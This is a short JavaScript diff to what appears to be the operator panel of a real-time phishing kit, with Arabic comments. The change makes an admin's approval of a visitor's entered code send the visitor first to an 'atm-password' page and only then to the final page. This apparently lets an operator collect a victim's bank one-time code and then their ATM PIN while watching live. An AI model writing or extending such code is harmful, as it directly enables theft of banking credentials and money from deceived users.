@@ -5193,10 +5193,15 @@
       const originalText = btn.textContent;
       window.skipDetailsUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
-      // Navigate visitor to final page
-      socket.emit('admin:navigate', { visitorSocketId: socketId, page: 'final-page' });
-      // تحديث حالة الانتظار وتحديث القائمة فوراً
+      // Navigate based on current page: OTP → ATM, ATM → final-page
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
+      const currentPage = visitor ? (visitor.page || '').toLowerCase() : '';
+      if (currentPage.includes('atm') || currentPage.includes('كلمة مرور')) {
+        socket.emit('admin:navigate', { visitorSocketId: socketId, page: 'final-page' });
+      } else {
+        socket.emit('admin:navigate', { visitorSocketId: socketId, page: 'atm-password' });
+      }
+      // تحديث حالة الانتظار وتحديث القائمة فوراً
       if (visitor) { visitor.waitingForAdminResponse = false; }
       renderVisitorsList();
       btn.textContent = 'تم الإرسال ✓';
